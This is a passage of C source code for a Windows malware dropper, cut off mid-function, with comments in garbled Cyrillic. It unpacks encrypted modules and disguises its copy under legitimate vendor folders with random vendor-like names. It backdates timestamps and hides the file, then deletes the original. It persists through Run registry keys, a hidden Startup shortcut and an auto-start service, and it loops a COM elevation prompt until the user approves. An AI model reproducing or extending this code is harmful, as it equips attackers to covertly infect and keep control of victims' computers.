//                         utils_file_unlock(globalData.hLockFile);
//                         globalData.hLockFile = NULL;
//                     }
//                     utils_file_write(pThis->modulePathName, CREATE_ALWAYS, pBuffer, remoteSize, FILE_BEGIN);
//                     utils_free(pBuffer);
//                     globalData.hLockFile = utils_file_lock(pThis->modulePathName, GENERIC_READ, OPEN_EXISTING);
//                 }
//             }
//         }
//         if (dropper_wait_util_shutdown(16 * 60 * 1000)) {
//             break;
//         }
//     }
// 
//     //fn_MessageBoxA(NULL, "End Thread", "dropper_self_update", MB_OK);
// 
//     return 0;
// }

uint8_t* dropper_unpack_zmodule(const uint8_t* pPackedModule, uint32_t packedSize, uint32_t* pSize)
{
    int err;
    uint8_t* pModule = 0;
    uint32_t szSize;
    uint8_t* decryptedModule;

    do {
        if (packedSize <= 0) {
            break;
        }

        decryptedModule = utils_decrypt_buffer(pPackedModule, packedSize, &szSize);
        err = utils_lzma_decompress(decryptedModule, szSize, (pvoid_t*)&pModule, pSize);
        memfree(decryptedModule);

        if (err != 0 || pModule == NULL) {
            pModule = 0;
            break;
        }
    } while (0);

    return pModule;
}

void dropper_deinstall_registry(HKEY hKey)
{
    int i;
    HKEY keyHandle;
    DWORD result;

    for (i = 0; gSubKeys[i].regPath != NULL; ++i) {
        if (fn_RegCreateKeyExW(hKey, gSubKeys[i].regPath, 0, 0, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_WOW64_32KEY, 0, &keyHandle, &result) == ERROR_SUCCESS) {
            if (fn_lstrcmpiW(gSubKeys[i].regKey, LOCKER_SYS_NAME) == 0) {
                fn_RegDeleteValueW(keyHandle, gSubKeys[i].regKey);
            }
//             else if (fn_lstrcmpiW(gSubKeys[i].regKey, APPINIT_DLLS) == 0) {
//                 wchar_t paramValue[MAX_PATH + 32];
//                 __stosb((uint8_t*)paramValue, 0, sizeof(paramValue));
//                 if (utils_reg_read_valueW(hKey, gSubKeys[i].regPath, gSubKeys[i].regKey, REG_SZ, paramValue, sizeof(paramValue), 1) == ERROR_SUCCESS) {
//                     wchar_t* ptr = fn_StrStrIW(paramValue, DROPPER_FILE_BASENAME);
//                     if (ptr != NULL) {
//                         for ( ; *ptr != L',' && ptr >= paramValue; --ptr);
//                         if (*ptr == L',') {
//                             *ptr = L'\0';
//                             fn_RegSetValueExW(keyHandle, gSubKeys[i].regKey, 0, REG_SZ, (const BYTE*)(paramValue), (DWORD)fn_lstrlenW(paramValue) * sizeof(wchar_t));
//                         }
//                     }
//                 }
//             }
//             else {
//                 wchar_t paramValue[MAX_PATH + 32];
//                 __stosb((uint8_t*)paramValue, 0, sizeof(paramValue));
//                 if (utils_reg_read_valueW(hKey, gSubKeys[i].regPath, gSubKeys[i].regKey, REG_SZ, paramValue, sizeof(paramValue), 1) == ERROR_SUCCESS) {
//                     wchar_t* ptr = fn_StrStrIW(paramValue, DROPPER_FILE_BASENAME);
//                     if (ptr != NULL) {
//                         for ( ; *ptr != L'"' && ptr >= paramValue; --ptr);
//                         if (*ptr == L'"') {
//                             for ( ; *ptr != L',' && ptr >= paramValue; --ptr);
//                             if (*ptr == L',') {
//                                 *ptr = L'\0';
//                                 fn_RegSetValueExW(keyHandle, gSubKeys[i].regKey, 0, REG_SZ, (const BYTE*)(paramValue), (DWORD)fn_lstrlenW(paramValue) * sizeof(wchar_t));
//                             }
//                         }
//                     }
//                 }
//             }
            fn_RegCloseKey(keyHandle);
        }
    }    
}
*/

const char* dropper_get_mutex_name()
{
    static char mutexName[64] = { 0 };
    const char* mutexKey = fn_utils_machine_guid();
    if (mutexKey != NULL) {
        mutexKey += 24;
    }
    else {
        mutexKey = (const char*)&_pZmoduleBlock->nullChar;
    }

    if (mutexName[0] == '\0') {
        fn_wsprintfA(mutexName, "Global\\%x%s", 0x11137889, mutexKey);
    }

    return mutexName;
}

HANDLE dropper_create_check_mutex()
{
    if (_mutexHandle == NULL) {
        const char* mutexName = dropper_get_mutex_name();
        if (_mutexHandle = fn_CreateMutexA(NULL, FALSE, mutexName)) {
            if (fn_GetLastError() != ERROR_ALREADY_EXISTS) {
                return _mutexHandle;
            }
            fn_CloseHandle(_mutexHandle);
        }
    }
    return 0;
}

void dropper_release_mutex()
{
    if (_mutexHandle != NULL) {
        fn_CloseHandle(_mutexHandle);
        _mutexHandle = NULL;
    }
}


BOOLEAN __stdcall dropper_enum_directory(PFILE_DIRECTORY_INFORMATION Information, PVOID Context)
{
    wchar_t* path;

    if (!(Information->FileAttributes & (FILE_ATTRIBUTE_DIRECTORY | FILE_ATTRIBUTE_DEVICE)) && Information->FileName[0] != L'.') {
        path = zs_new((const wchar_t*)Context);
        path = zs_cat(path, Information->FileName);
        vector_push_back(_paths, path);
    }
    return TRUE;
}


BOOLEAN __stdcall dropper_enum_vendor_directory(PFILE_DIRECTORY_INFORMATION Information, PVOID Context)
{
    wchar_t* path;
    HANDLE hFile;

    if (Information->FileAttributes & FILE_ATTRIBUTE_DIRECTORY && Information->FileName[0] != L'.') {
        const wchar_t** vendorItr = _vendors;
        for (; *vendorItr != NULL; ++vendorItr) {
            if (fn_StrStrIW(Information->FileName, *vendorItr) != NULL) {
                wchar_t randomName[32];
                utils_wcs_random(randomName, 32);
                path = zs_new((const wchar_t*)Context);
                path = zs_cat(path, Information->FileName);
                path = zs_cat(path, _pZmoduleBlock->slashString);
                path = zs_cat(path, randomName);

                // ��������� �������� �� ���������� ��� ������, ����������� ������� ����.
                if (NT_SUCCESS(native_create_file_win32(&hFile, path, FILE_GENERIC_WRITE, 0, FILE_SHARE_READ, FILE_CREATE, FILE_SYNCHRONOUS_IO_NONALERT, NULL))) {
                    fn_NtClose(hFile);
                    native_delete_file_win32(path);
                    zs_free(path);
                    path = zs_new((const wchar_t*)Context);
                    path = zs_cat(path, Information->FileName);
                    path = zs_cat(path, _pZmoduleBlock->slashString);
                    vector_push_back(_paths, path);
                }
                else {
                    LOG("Cannot use directory: %S", (const wchar_t*)Context);
                }

                break;
            }
        }
    }
    return TRUE;
}

wchar_t* dropper_gen_random_name(int* pIndex, const wchar_t* vendorName, const wchar_t* ext)
{
    int i, seqId, indx, titleIndex;
    wchar_t* targetName;
    static uint8_t ids[] = { 0, 1, 2, 0, 2, 1, 1, 0, 2, 1, 2, 0, 2, 0, 1, 2, 1, 0 };

    targetName = zs_new(NULL);

    // ���������� ��������� ��� �����.
    seqId = utils_random() % 6;
    for (i = 0; i < 3; ++i) {
        uint8_t val = ids[seqId * 3 + i];
        switch (val) {
        case 0:
            if (i == 0) {
                targetName = zs_cat(targetName, vendorName);
                if (utils_random() % 2) {
                    targetName = zs_cat(targetName, L" ");
                }
            }
            else {
                if (utils_random() % 2) {
                    targetName = zs_catprintf(targetName, L"%u%u%u%u%d", _pZmoduleBlock->sysInfo.osMajorVer, _pZmoduleBlock->sysInfo.osMinorVer, _pZmoduleBlock->sysInfo.osSp, _pZmoduleBlock->sysInfo.osProductType, _pZmoduleBlock->sysInfo.isWow64);
                }
            }
            break;
        case 1:
            titleIndex = utils_random() % (sizeof(_fnameSuffixes) / sizeof(_fnameSuffixes[0]));
            targetName = zs_catprintf(targetName, L"%S", _fnameSuffixes[titleIndex]);
            break;
        case 2:
            if (i < 2) {
                indx = utils_random() % 2;
                targetName = zs_cat(targetName, (indx ? L"_" : NULL));
            }
            else {
                targetName = zs_cat(targetName, L"_win32");
            }
            break;
        }
    }

    if (ext != NULL) {
        targetName = zs_cat(targetName, ext);
    }
    else {
        targetName = zs_cat(targetName, _pZmoduleBlock->moduleExt);
    }
    if (pIndex != NULL) {
        *pIndex = titleIndex;
    }
    return targetName;
}

void dropper_get_creation_time(const wchar_t* path, LARGE_INTEGER* pVal)
{
    FILE_NETWORK_OPEN_INFORMATION fnoi;
    native_query_file_attributes(path, &fnoi);
    *pVal = fnoi.CreationTime;
}


void dropper_delete_current_moudle()
{
    int counter;
    NTSTATUS ntStatus;

    if (_pZmoduleBlock->modulePathName != NULL) {
        for (counter = 0; !NT_SUCCESS(ntStatus = native_delete_file_win32(_pZmoduleBlock->modulePathName)) && counter < 3; ++counter) {
            fn_Sleep(1000);
        }

        if (!NT_SUCCESS(ntStatus)) {
            fn_MoveFileExW(_pZmoduleBlock->modulePathName, 0, MOVEFILE_DELAY_UNTIL_REBOOT | MOVEFILE_WRITE_THROUGH);
        }

        // �������� ������� ���� � ������������� �����.
        __stosb(_pZmoduleBlock->modulePathName, 0, sizeof(_pZmoduleBlock->modulePathName));
    }
}

void dropper_load_current_module()
{
    int counter;

    // ��������� � ������ ������������ ������.
    for (counter = 0; (_pZmoduleBlock->moduleBuffer = utils_file_read(_pZmoduleBlock->modulePathName, &_pZmoduleBlock->moduleSize)) == NULL && counter < 3; ++counter) {
        fn_Sleep(1000);
    }

    LOG("Loaded self at address 0x%08X with size %u", _pZmoduleBlock->moduleBuffer, _pZmoduleBlock->moduleSize);
}


BOOL dropper_save_module(const wchar_t* pathName, LARGE_INTEGER* pCreationTime)
{
    BOOL ret = FALSE;
    if (utils_file_write(pathName, FILE_CREATE, _pZmoduleBlock->moduleBuffer, _pZmoduleBlock->moduleSize)) {
        FILE_BASIC_INFORMATION fbi;

        fbi.CreationTime = *pCreationTime;
        fbi.ChangeTime = fbi.CreationTime;
        fbi.LastAccessTime = fbi.CreationTime;
        fbi.LastWriteTime = fbi.CreationTime;
        fbi.FileAttributes = FILE_ATTRIBUTE_HIDDEN;
        native_set_file_attributes(pathName, &fbi);
        ret = TRUE;
    }

    return ret;
}

void dropper_update_module_path(const wchar_t* newPath)
{
    wchar_t* ptr;

    fn_lstrcpyW(_pZmoduleBlock->modulePathName, newPath);
    fn_lstrcpyW(_pZmoduleBlock->modulePath, newPath);
    ptr = _pZmoduleBlock->modulePath + fn_lstrlenW(_pZmoduleBlock->modulePath);
    for (; *ptr != L'.'; --ptr);
    _pZmoduleBlock->moduleExt = ptr;
    for (; ptr >= _pZmoduleBlock->modulePath && *ptr != L'\\'; --ptr);
    *ptr = L'\0';
    _pZmoduleBlock->moduleName = ptr + 1;

    LOG("Updated core module filepath: %S", _pZmoduleBlock->modulePathName);
    LOG("Updated core module path: %S", _pZmoduleBlock->modulePath);
    LOG("Updated core module name: %S", _pZmoduleBlock->moduleName);
    LOG("Updated core module ext: %S", _pZmoduleBlock->moduleExt);
}

wchar_t* dropper_prepare_run_command(const wchar_t* targetPath)
{
	wchar_t* cmd;

	if (_pZmoduleBlock->rundll32ExportName != NULL) {
		cmd = zs_new_with_len(NULL, MAX_PATH + 64);
        /*
#ifndef _WIN64
		if (_pZmoduleBlock->sysInfo.isWow64) {
			fn_SHGetSpecialFolderPathW(0, cmd, CSIDL_SYSTEMX86, FALSE);
		}
		else
#endif // _WIN64
        */
		{
			fn_SHGetSpecialFolderPathW(0, cmd, CSIDL_SYSTEM, FALSE);
		}
		zs_update_length(cmd);
		cmd = zs_append_slash_if_needed(cmd);
		cmd = zs_cat(cmd, L"rundll32.exe \"");
		cmd = zs_cat(cmd, targetPath);
		cmd = zs_cat(cmd, L"\",");
		cmd = zs_cat(cmd, _pZmoduleBlock->rundll32ExportName);
	}
	else {
		cmd = zs_new(targetPath);
	}

	return cmd;
}

int __stdcall dropper_save_file_with_user_request(const wchar_t* pathFrom, wchar_t* pathTo)
{
    int ret = 0;
    HRESULT hResult;
    BIND_OPTS3 bo;
    IFileOperation* pFileOp = NULL;
    IShellItem* pSHISource = NULL;
    IShellItem* pSHIDestination = NULL;
    wchar_t* fileName = pathTo + zs_length(pathTo);
    
    for (; *fileName != L'\\'; --fileName);
    *(fileName++) = L'\0';

#ifndef _WIN64
    PVOID fsRedirOld;
#endif // _WIN64;

#ifndef _WIN64
    if (_pZmoduleBlock->sysInfo.isWow64) {
        if (fn_Wow64DisableWow64FsRedirection != NULL) {
            if (!fn_Wow64DisableWow64FsRedirection(&fsRedirOld)) {
                return 0;
            }
        }
    }
#endif // _WIN64

    if (SUCCEEDED(fn_CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE))) {
        __stosb((uint8_t*)&bo, 0, sizeof(bo));
        bo.cbStruct = sizeof(bo);
        bo.dwClassContext = CLSCTX_LOCAL_SERVER;

        hResult = fn_CoGetObject(L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}", (BIND_OPTS*)&bo, &IID_IFileOperation, &pFileOp);
        if (SUCCEEDED(hResult)) {
            DWORD flags;
#ifdef _WIN64
            flags = CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_SERVER | CLSCTX_INPROC_HANDLER;
#else
            if (_pZmoduleBlock->sysInfo.isWow64) {
                flags = CLSCTX_LOCAL_SERVER;
            }
            else {
                flags = CLSCTX_INPROC_SERVER | CLSCTX_INPROC_HANDLER | CLSCTX_LOCAL_SERVER;
            }
#endif // _WIN64
            hResult = fn_CoCreateInstance(&CLSID_FileOperation, NULL, flags, &IID_IFileOperation, (PVOID*)&pFileOp);

            if (SUCCEEDED(hResult)) {
                hResult = pFileOp->lpVtbl->SetOperationFlags(pFileOp, FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION);
                if (FAILED(hResult)) {
                    hResult = pFileOp->lpVtbl->SetOperationFlags(pFileOp, FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS);
                }

                if (SUCCEEDED(hResult)) {
                    if (SUCCEEDED(fn_SHCreateItemFromParsingName(pathFrom, NULL, &IID_IShellItem2, (PVOID*)&pSHISource)) &&
                        SUCCEEDED(fn_SHCreateItemFromParsingName(pathTo, NULL, &IID_IShellItem2, (PVOID*)&pSHIDestination)) &&
                        SUCCEEDED(pFileOp->lpVtbl->CopyItem(pFileOp, pSHISource, pSHIDestination, fileName, NULL)) &&
                        SUCCEEDED(pFileOp->lpVtbl->PerformOperations(pFileOp))) {
                        BOOL bAborted = TRUE;
                        while (bAborted) {
                            hResult = pFileOp->lpVtbl->GetAnyOperationsAborted(pFileOp, &bAborted);
                            if (!SUCCEEDED(hResult)) {
                                LOG("GetAnyOperationsAborted failed with error %08X", hResult);
                                break;
                            }
                        }
                        ret = 1;
                    }
                }
                if (pSHIDestination != NULL) {
                    pSHIDestination->lpVtbl->Release(pSHIDestination);
                }
                if (pSHISource != NULL) {
                    pSHISource->lpVtbl->Release(pSHISource);
                }
                if (pFileOp != NULL) {
                    pFileOp->lpVtbl->Release(pFileOp);
                }
            }
        }
        fn_CoUninitialize();
    }

    *(--fileName) = L'\\';

#ifndef _WIN64
    if (_pZmoduleBlock->sysInfo.isWow64) {
        if (fn_Wow64RevertWow64FsRedirection != NULL) {
            fn_Wow64RevertWow64FsRedirection(fsRedirOld);
        }
    }
#endif // _WIN64

    return ret;
}

HRESULT __stdcall dropper_create_startup_lnk(const wchar_t* lnkName, const wchar_t* targetPath, LARGE_INTEGER* pCreationTime)
{
    HRESULT hResult;
    IShellLinkW* pSL;
    wchar_t* lnkPath = zs_new_with_len(NULL, MAX_PATH);

	if (fn_SHGetSpecialFolderPathW(0, lnkPath, CSIDL_STARTUP, FALSE)) {
		fn_PathAppendW(lnkPath, lnkName);
		fn_lstrcatW(lnkPath, L".lnk");
        zs_update_length(lnkPath);

		hResult = fn_CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLinkW, (LPVOID*)&pSL);
		if (SUCCEEDED(hResult)) {
			IPersistFile* ppf;
			wchar_t* paramValue = dropper_prepare_run_command(targetPath);
			pSL->lpVtbl->SetPath(pSL, paramValue);

			hResult = pSL->lpVtbl->QueryInterface(pSL, &IID_IPersistFile, (void**)&ppf);
			if (SUCCEEDED(hResult)) {
				FILE_BASIC_INFORMATION fbi;
				hResult = ppf->lpVtbl->Save(ppf, lnkPath, TRUE);
                if (hResult == E_ACCESSDENIED) {
                    // ����� ���������� ������������ ��������� ��������� ����.
                    wchar_t* path = utils_get_known_path(&FOLDERID_LocalAppDataLow);
                    wchar_t tempFileName[MAX_PATH];

                    LOG("Access denied on creating startup link. Trying through UAC-request");

                    fn_GetTempFileNameW(path, NULL, fn_GetTickCount(), tempFileName);
                    zs_free(path);
                    hResult = ppf->lpVtbl->Save(ppf, tempFileName, TRUE);
                    if (SUCCEEDED(hResult)) {
                        while (!dropper_save_file_with_user_request(tempFileName, lnkPath)) {
                            fn_Sleep(7000);
                        }
                        hResult = 0;
                    }
                    native_delete_file_win32(tempFileName);
                }
				ppf->lpVtbl->Release(ppf);

                if (SUCCEEDED(hResult)) {
                    // ������ ����� ������� � ������������ ����.
                    fbi.ChangeTime = *pCreationTime;
                    fbi.CreationTime = fbi.ChangeTime;
                    fbi.LastAccessTime = fbi.ChangeTime;
                    fbi.LastWriteTime = fbi.ChangeTime;
                    fbi.FileAttributes = FILE_ATTRIBUTE_HIDDEN;
                    native_set_file_attributes(lnkPath, &fbi);
                }
			}
			pSL->lpVtbl->Release(pSL);
			zs_free(paramValue);
		}
	}

    zs_free(lnkPath);
   
    return hResult;
}

int dropper_create_registry_autoruns(wchar_t* name, wchar_t* targetPath)
{
	int ret = 0;
	HKEY hKey;
	wchar_t* autorunPath;

	for (int nroots = 0; nroots < ARRAYSIZE(_regRoots); ++nroots) {
		for (int npath = 0; npath < ARRAYSIZE(_regAutorunPaths); ++npath) {
			autorunPath = zs_new(_regAutorunPaths[npath]);
			
			if (NT_SUCCESS(native_create_key(&hKey, KEY_WRITE | KEY_WOW64_32KEY, _regRoots[nroots], autorunPath, 0, 0, NULL))) {
				wchar_t* paramValue = dropper_prepare_run_command(targetPath);
				UNICODE_STRING uName;
				native_zms_to_unicode(name, &uName);
				if (NT_SUCCESS(fn_NtSetValueKey(hKey, &uName, 0, REG_SZ, paramValue, (ULONG)zs_length(paramValue) * sizeof(wchar_t)))) {
					LOG("Successfully installed in %s\\%S as '%S'", (_regRoots[nroots] == NATIVE_KEY_CURRENT_USER ? "HKEY_CURRENT_USER" : "HKEY_LOCAL_MACHINE"), _regAutorunPaths[npath], name);
					ret = 1;
				}
				zs_free(paramValue);
				fn_NtClose(hKey);
			}

			zs_free(autorunPath);
		}
	}

	return ret;
}

int dropper_check_and_install_ring3_simple(wchar_t** pTargetPath)
{
    int ret = 0;
    wchar_t* path;
    wchar_t* targetPath = NULL;
    wchar_t* targetName = NULL;
	HANDLE hDir;
	int indx, titleIndex;
	HANDLE hReg;
	NTSTATUS ntStatus;
	static const ACCESS_MASK masks[] = { KEY_WOW64_64KEY | KEY_READ, KEY_WOW64_32KEY | KEY_READ };
	wchar_t* autorunPath;
	vector_t arunKeys = vector_new();
	vector_t arunValues = vector_new();
	iterator_t itr, itr1, itrEnd;
	LARGE_INTEGER creationTime;
    BOOL triedAsLow = FALSE;
    BOOL ignoreReg = FALSE, ignoreStartup = FALSE;

	// ��������� ����� �������.
	for (int nroots = 0; nroots < ARRAYSIZE(_regRoots); ++nroots) {
		for (int nmask = 0; nmask < ARRAYSIZE(masks); ++nmask) {
			for (int npath = 0; npath < ARRAYSIZE(_regAutorunPaths); ++npath) {
				autorunPath = zs_new(_regAutorunPaths[npath]);
				ntStatus = native_open_key(&hReg, masks[nmask], _regRoots[nroots], autorunPath, 0);
				if (NT_SUCCESS(ntStatus)) {
					ULONG index;
					for (index = 0;; ++index) {
						wchar_t* key;
						wchar_t* value;
						PKEY_VALUE_FULL_INFORMATION pInfo;
						ntStatus = native_enumerate_key_value(hReg, KeyValueFullInformation, index, (PVOID*)&pInfo);
						if (ntStatus == STATUS_NO_MORE_ENTRIES) {
							break;
						}
						else if (!NT_SUCCESS(ntStatus)){
							break;
						}

						key = zs_new_with_len(pInfo->Name, pInfo->NameLength / sizeof(wchar_t));
						value = zs_new_with_len((wchar_t*)((char*)pInfo + pInfo->DataOffset), pInfo->DataLength / sizeof(wchar_t));

						vector_push_back(arunKeys, key);
						vector_push_back(arunValues, value);

						memory_free(pInfo);
					}
					fn_NtClose(hReg);
				}

				zs_free(autorunPath);
			}
		}
	}

    for (itr = vector_begin(arunValues), itr1 = vector_begin(arunKeys), itrEnd = vector_end(arunValues); itr != itrEnd; ++itr, ++itr1) {
		const wchar_t* value = (wchar_t*)*itr;
		if (fn_StrStrIW(value, _pZmoduleBlock->modulePathName) != NULL) {
            // ���� ����� ������ ���������� ���� � ������ �����, �� ���������� ��������� ������������� � ������.
            ignoreReg = TRUE;
            targetPath = zs_new(_pZmoduleBlock->modulePathName);
            autorunPath = zs_new((wchar_t*)*itr1);
            dropper_get_creation_time(_pZmoduleBlock->modulePath, &creationTime);
            LOG("Core module already deployed in system (registry)!");
            LOG("Target path: %S", targetPath);
            LOG("Target name: %S", autorunPath);
			break;
		}
	}

    // ��������� ����������.
    path = zs_new_with_len(NULL, MAX_PATH);

    if (fn_SHGetSpecialFolderPathW(0, path, CSIDL_STARTUP, FALSE)) {
        zs_update_length(path);

        if (NT_SUCCESS(native_create_file_win32(&hDir, path, FILE_GENERIC_READ, 0, FILE_SHARE_READ, FILE_OPEN, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL))) {
            UNICODE_STRING pattern = RTL_CONSTANT_STRING(L"*");

            _paths = vector_new();
            path = zs_append_slash_if_needed(path);
            native_enum_directory_file(hDir, &pattern, dropper_enum_directory, path);
            fn_NtClose(hDir);

            if (vector_count(_paths) != 0) {
                // ������������ ������
                for (itr = vector_begin(_paths), itrEnd = vector_end(_paths); itr != itrEnd; ++itr) {
                    const wchar_t* linkPath = (wchar_t*)*itr;
                    if (zs_ends_with(linkPath, L".lnk")) {
                        HRESULT hResult;
                        IShellLinkW* pSL;
                        hResult = fn_CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLinkW, (LPVOID*)&pSL);
                        if (SUCCEEDED(hResult)) {
                            IPersistFile* ppf;
                            hResult = pSL->lpVtbl->QueryInterface(pSL, &IID_IPersistFile, (void**)&ppf);
                            if (SUCCEEDED(hResult)) {
                                hResult = ppf->lpVtbl->Load(ppf, linkPath, STGM_READ);
                                if (SUCCEEDED(hResult)) {
                                    wchar_t lnkTargetPath[MAX_PATH];
                                    ppf->lpVtbl->Release(ppf);
                                    pSL->lpVtbl->GetPath(pSL, lnkTargetPath, MAX_PATH, NULL, SLGP_RAWPATH);
                                    pSL->lpVtbl->Release(pSL);
                                    if (fn_StrStrIW(lnkTargetPath, _pZmoduleBlock->modulePathName) != NULL) {
                                        // ���� ����� ������ ���������� ���� � ������ �����, �� ���������� ��������� ������������� � ������.
                                        ignoreStartup = TRUE;
                                        if (targetPath == NULL) {
                                            wchar_t* ptr = linkPath + fn_lstrlenW(linkPath) - 4;
                                            *ptr = L'\0';
                                            for (; ptr > linkPath && *ptr != L'\\'; --ptr);
                                            autorunPath = zs_new(ptr);
                                            targetPath = zs_new(_pZmoduleBlock->modulePathName);    

                                            dropper_get_creation_time(_pZmoduleBlock->modulePath, &creationTime);
                                        }
                                        LOG("Core module already deployed in system (startup)!");
                                        LOG("Target path: %S", targetPath);
                                        LOG("Target name: %S", autorunPath);
                                        zs_free(targetPath);
                                        break;
                                    }
                                    zs_free(targetPath);
                                }
                            }
                        }
                    }
                }
            }

            vector_destroy_strings(_paths);
        }
    }

    zs_free(path);

    if (!ignoreReg || !ignoreStartup) {
        BOOL apiRet;
		
        if (targetPath == NULL) {
            // ����������� ���� � �������.
            path = zs_new_with_len(NULL, MAX_PATH + 64);

            if (_pZmoduleBlock->securityMask & (MANDATORY_LEVEL_UNTRUSTED | MANDATORY_LEVEL_LOW | MANDATORY_LEVEL_MEDIUM)) {
                apiRet = fn_SHGetSpecialFolderPathW(0, path, CSIDL_COMMON_APPDATA, FALSE);
            }
            else {
                apiRet = fn_SHGetSpecialFolderPathW(0, path, CSIDL_PROGRAM_FILES, FALSE);
            }
            if (!apiRet) {
                LOG("SHGetSpecialFolderPath(CSIDL_COMMON_APPDATA) failed with error %08X", fn_GetLastError());
                zs_free(path);
                if (_pZmoduleBlock->sysInfo.osMajorVer >= 6) {
                    path = utils_get_known_path(&FOLDERID_LocalAppDataLow);
                    if (path == NULL) {
                        return ret;
                    }
                }
            }
            zs_update_length(path);

            // ������ ����� ����� ������� ������ ����� ��� ������������� ����������. ����� ��� ��������� ������� ������� ����� ������ �� ���������� ��������������
            // � ���� �������� ��� ������, ������ ��� �������.
lScanAgain:
            if (NT_SUCCESS(native_create_file_win32(&hDir, path, FILE_GENERIC_READ, 0, FILE_SHARE_READ, FILE_OPEN, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL))) {
                UNICODE_STRING pattern = RTL_CONSTANT_STRING(L"*");

                _paths = vector_new();
                path = zs_append_slash_if_needed(path);
                native_enum_directory_file(hDir, &pattern, dropper_enum_vendor_directory, path);
                fn_NtClose(hDir);

                if (vector_count(_paths) == 0) {
                    if (!triedAsLow && _pZmoduleBlock->sysInfo.osMajorVer >= 6) {
                        triedAsLow = TRUE;
                        zs_free(path);
                        path = utils_get_known_path(&FOLDERID_LocalAppDataLow);
                        goto lScanAgain;
                    }
                    else {
                        LOG("No target paths");
                    }
                }
            }

            zs_free(path);

            indx = utils_random() % vector_count(_paths);
            targetPath = zs_new(vector_access(_paths, indx));
            LOG("Target installation path: %S", targetPath);
            // ���������� ������ ��������� ����� �� �������������.
            vector_destroy_strings(_paths);

            dropper_get_creation_time(targetPath, &creationTime);

            autorunPath = NULL;
            for (const wchar_t** vendorItr = _vendors; *vendorItr != NULL; ++vendorItr) {
                if (fn_StrStrIW(targetPath, *vendorItr) != NULL) {
                    targetName = dropper_gen_random_name(&titleIndex, *vendorItr, NULL);
                    targetPath = zs_cat(targetPath, targetName);
                    autorunPath = zs_new(NULL);
                    autorunPath = zs_cat(autorunPath, *vendorItr);
                    autorunPath = zs_cat(autorunPath, _autorunSuffixes[titleIndex]);
                    break;
                }
            }
        }

        // ������ ������ � �������.
        if (ignoreReg) {
            ret = 1;
        }
        else {
            ret = dropper_create_registry_autoruns(autorunPath, targetPath);
        }

        // ������ ����� � �����������.
        if (ignoreStartup) {
            ret = 1;
        }
        else if (SUCCEEDED(dropper_create_startup_lnk(autorunPath, targetPath, &creationTime))) {
            ret = 1;
        }

        if (ret && !(ignoreReg || ignoreStartup)) {
            if (fn_lstrcmpiW(targetPath, _pZmoduleBlock->modulePathName) != 0) {
                // ��������� ���� � ������� ����� � ������� �� ������� �������.
                dropper_load_current_module();
                if (dropper_save_module(targetPath, &creationTime)) {
                    *pTargetPath = targetPath;
                    dropper_delete_current_moudle();
                    dropper_update_module_path(targetPath);
                    LOG("Core module successfully installed (rundll32.exe): %S", targetPath);
                }
                else {
                    LOG("Core module not installed (rundll32.exe): %S", targetPath);
                }
            }
            else {
                *pTargetPath = targetPath;
            }
        }
        
        if (ret && (ignoreReg || ignoreStartup)) {
            *pTargetPath = targetPath;
        }

        if (!ret) {
            zs_free(targetPath);
        }
        if (autorunPath != NULL) {
            zs_free(autorunPath);
        }
        if (targetName != NULL) {
            zs_free(targetName);
        }
	}
	else {
		ret = 1;
	}

    return ret;
}

int __stdcall dropper_install_ring3_service(wchar_t** pTargetPath)
{
    int ret = 0, indx, titleIndex;
    wchar_t* path;
    wchar_t* targetPath;
    wchar_t* targetName;
    wchar_t* displayName;
    HANDLE hDir;
    LARGE_INTEGER creationTime;
    
    path = zs_new_with_len(NULL, MAX_PATH + 64);
    if (!fn_SHGetSpecialFolderPathW(0, path, CSIDL_PROGRAM_FILES, FALSE)) {
        return ret;
    }
    zs_update_length(path);

    // ������ ����� ����� ������� ������ ����� ��� ������������� ����������. ����� ��� ��������� ������� ������� ����� ������ �� ���������� ��������������
    // � ���� �������� ��� ������, ������ ��� �������.
    if (NT_SUCCESS(native_create_file_win32(&hDir, path, FILE_GENERIC_READ, 0, FILE_SHARE_READ, FILE_OPEN, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL))) {
        UNICODE_STRING pattern = RTL_CONSTANT_STRING(L"*");

        _paths = vector_new();
        path = zs_append_slash_if_needed(path);
        native_enum_directory_file(hDir, &pattern, dropper_enum_vendor_directory, path);
        fn_NtClose(hDir);
    }

    zs_free(path);

    indx = utils_random() % vector_count(_paths);
    targetPath = zs_new(vector_access(_paths, indx));
    LOG("Target installation path: %S", targetPath);
    // ���������� ������ ��������� ����� �� �������������.
    vector_destroy_strings(_paths);

    dropper_get_creation_time(targetPath, &creationTime);

    displayName = NULL;
    for (const wchar_t** vendorItr = _vendors; *vendorItr != NULL; ++vendorItr) {
        if (fn_StrStrIW(targetPath, *vendorItr) != NULL) {
            targetName = dropper_gen_random_name(&titleIndex, *vendorItr, L".exe");
            targetPath = zs_cat(targetPath, targetName);

            displayName = zs_new(NULL);
            displayName = zs_cat(displayName, *vendorItr);
            displayName = zs_cat(displayName, _autorunSuffixes[titleIndex]);
            break;
        }
    }    

    if (displayName != NULL) {
        pwin32service_t pService = service_new(targetName);
        wchar_t* runCommand = dropper_prepare_run_command(targetPath);
        if (service_register(pService, runCommand, displayName) != NULL) {
            if (service_set_config(pService, SERVICE_NO_CHANGE, SERVICE_AUTO_START, NULL, NULL)) {
                ret = 1;
            }

            if (ret) {
                // ��������� ���� � ������� ����� � ������� �� ������� �������.
                dropper_load_current_module();
                if (dropper_save_module(targetPath, &creationTime)) {
                    *pTargetPath = targetPath;
                    dropper_delete_current_moudle();
                    dropper_update_module_path(targetPath);
                    LOG("Core module successfully installed (rundll32.exe): %S", targetPath);
                }
                else {
                    LOG("Core module not installed (rundll32.exe): %S", targetPath);
                }
                
                // ����������� ������, ����� ������ �� ����������.
                dropper_release_mutex();

                // ��������� ������.
                if (service_start(pService)) {
